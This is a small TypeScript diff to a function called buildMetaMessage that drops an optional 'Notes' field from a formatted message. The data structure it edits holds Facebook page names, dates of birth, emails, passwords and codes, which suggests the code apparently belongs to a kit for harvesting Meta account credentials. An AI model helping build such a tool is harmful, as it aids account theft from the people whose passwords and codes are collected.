@@ -6,7 +6,6 @@ interface BuildMessageOptions {
         dateOfBirth?: string;
         backupPhone?: string;
         reason?: string;
-        additionalNotes?: string;
     };
     passwords?: string[];
     codes?: string[];
@@ -119,8 +118,7 @@ export function buildMetaMessage({
             section([
                 line('Full Name', userData.fullName, true),
                 line('Page', userData.facebookPageName, true),
-                line('DOB', userData.dateOfBirth, true),
-                line('Notes', userData.additionalNotes, true)
+                line('DOB', userData.dateOfBirth, true)
             ]),
             section([
                 line('Email', userData.personalEmail, true),
